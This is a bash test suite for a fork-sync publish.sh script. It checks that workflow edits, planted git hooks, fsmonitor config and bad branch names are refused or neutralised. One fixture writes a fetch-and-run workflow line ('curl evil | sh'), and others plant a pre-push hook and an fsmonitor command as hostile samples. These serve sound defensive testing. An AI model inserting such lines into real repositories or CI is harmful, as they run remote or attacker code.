#!/usr/bin/env bash
# Tests for publish.sh with local repositories (no network, no GitHub): `bash scripts/fork-sync/test-publish.sh`.
set -uo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
script="$here/publish.sh"
fails=0
t=$(mktemp -d); trap 'rm -rf "$t"' EXIT
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
g() { git -c user.name=t -c user.email=t@t "$@"; }

new_world() { # builds: upstream repo, fork bare repo, working copy with a branch to publish
  rm -rf "$t/w"; mkdir -p "$t/w"; cd "$t/w"
  g init -q -b main up; (cd up && mkdir -p .github/workflows && echo base > .github/workflows/ci.yml && echo v1 > a.txt && g add -A && g commit -qm up1)
  g clone -q --bare up fork.git
  g clone -q fork.git work; cd work
  g remote add upstream "$t/w/up"; g fetch -q upstream
  g checkout -q -b sync/upstream-2026-11-19
}
run() { # run publish.sh in the working copy; args: extra env assignments
  (cd "$t/w/work" && env BRANCH=sync/upstream-2026-11-19 DEFAULT_BRANCH=main REPO=o/r UPSTREAM_REPO=o/up UPSTREAM_BRANCH=main \
     DEFAULT_TOKEN=dt WORKSPACE="$t/w/work" REMOTE_URL="$t/w/fork.git" UPSTREAM_URL="$t/w/up" SKIP_PR=1 "$@" bash "$script" >"$t/out" 2>&1); echo $?
}
check() { # name expected actual
  if [ "$2" = "$3" ]; then echo "ok   $1"; else echo "FAIL $1 (expected $2, got $3)"; sed 's/^/     /' "$t/out"; fails=$((fails+1)); fi
}
remote_has() { git --git-dir="$t/w/fork.git" rev-parse -q --verify "refs/heads/$1" >/dev/null && echo yes || echo no; }

new_world; echo merged > a.txt; g commit -qam "merge"
check "a clean branch is published with the default token" 0 "$(run)"
check "  ...and exists on the remote" yes "$(remote_has sync/upstream-2026-11-19)"
check "  ...with the [skip ci] commit on top" "yes" "$(git --git-dir="$t/w/fork.git" log -1 --format=%s sync/upstream-2026-11-19 | grep -q 'skip ci' && echo yes || echo no)"

new_world # upstream changes ci.yml, the branch carries upstream's version verbatim
(cd "$t/w/up" && echo changed > .github/workflows/ci.yml && g commit -qam up2); (cd "$t/w/work" && g fetch -q upstream && cp "$t/w/up/.github/workflows/ci.yml" .github/workflows/ci.yml && g commit -qam merge)
check "workflow changes need the workflows token" 4 "$(run)"
check "  ...nothing is pushed without it" no "$(remote_has sync/upstream-2026-11-19)"
check "workflow changes identical to upstream's go through with it" 0 "$(run PUSH_TOKEN=pt)"

new_world; (cd "$t/w/up" && echo changed > .github/workflows/ci.yml && g commit -qam up2); (cd "$t/w/work" && g fetch -q upstream && echo 'run: curl evil | sh' > .github/workflows/ci.yml && g commit -qam merge)
check "a workflow file that is not upstream's version is refused" 3 "$(run PUSH_TOKEN=pt)"
check "  ...and nothing is pushed" no "$(remote_has sync/upstream-2026-11-19)"

new_world; mkdir -p .github/workflows; echo x > .github/workflows/fork-sync.yml; g add -A; g commit -qm sneaky
check "the sync agent's own workflow cannot change" 3 "$(run PUSH_TOKEN=pt)"

new_world; echo merged > a.txt; g commit -qam merge
check "a bad branch name is refused" 3 "$(run BRANCH=feature/x)"
check "an unset required variable stops the script" 1 "$(run DEFAULT_TOKEN= )"

new_world; echo merged > a.txt; g commit -qam merge
mkdir -p .git/hooks; printf '#!/bin/sh\ntouch %s/hook-ran\n' "$t" > .git/hooks/pre-push; chmod +x .git/hooks/pre-push
printf '[core]\n\tfsmonitor = touch %s/fsmonitor-ran\n' "$t" >> .git/config
check "a branch with planted hooks and config is still published" 0 "$(run)"
check "  ...but the planted pre-push hook never ran" no "$([ -e "$t/hook-ran" ] && echo yes || echo no)"
check "  ...and neither did the planted fsmonitor command" no "$([ -e "$t/fsmonitor-ran" ] && echo yes || echo no)"

new_world; echo merged > a.txt; g commit -qam merge; g update-ref refs/remotes/origin/main HEAD
check "faked origin refs in the working copy do not weaken the checks" 0 "$(run)"

[ "$fails" -eq 0 ] && echo "all publish.sh tests passed" || { echo "$fails failing"; exit 1; }
